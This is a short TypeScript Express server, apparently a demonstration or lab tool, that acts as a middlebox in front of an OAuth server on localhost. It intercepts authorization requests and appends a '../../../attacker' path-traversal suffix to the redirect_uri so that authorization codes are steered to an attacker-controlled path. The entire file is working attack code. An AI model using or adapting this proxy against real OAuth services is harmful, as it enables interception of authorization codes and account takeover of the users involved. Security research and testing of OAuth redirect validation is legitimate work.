import express from "express";

const app = express();

app.get("/oauth/authorize", (req, res) => {
    const {redirect_uri} = req.query
    const params = new URLSearchParams({
        ...(req.query as Record<string, string>),
        redirect_uri: redirect_uri+"../../../attacker",
    });

    res.redirect(`http://localhost:3001/oauth/authorize?${params}`);
});

app.listen(8080, () => console.log("Middlebox running on :8080"));
